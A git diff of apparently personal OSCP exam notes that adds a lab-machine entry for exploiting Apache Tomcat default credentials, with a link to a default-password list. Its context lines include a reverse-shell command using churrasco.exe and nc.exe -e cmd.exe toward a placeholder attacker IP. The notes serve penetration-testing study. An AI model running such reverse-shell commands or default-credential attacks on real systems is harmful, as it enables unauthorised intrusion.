@@ -78,6 +78,7 @@ https://github.com/tedchen0001/OSCP-Notes/blob/master/AD.md
 | Grandpa | Windows Server 2003, IIS WebDAV CVE-2017-7269 | WMI Service Isolation Privilege Escalation (churrasco) ||
 | Granny | Windows Server 2003, IIS WebDAV CVE-2017-7269 | WMI Service Isolation Privilege Escalation (churrasco) ||
 | *Intelligence | username(pdf creator), add AD Integrated DNS records  | group ReadGMSAPassword | :white_check_mark: |
+| Jerry | Tomcat default credential, deploy | no need ||
 
 (*):review before the exam
 
@@ -331,4 +332,10 @@ Used in ```Grandpa```
 
 ```
 churrasco.exe "nc.exe -e cmd.exe <attacker ip> <attacker port>"
+```
+
+Used in ```Jerry```
+
+```
+https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
 ```
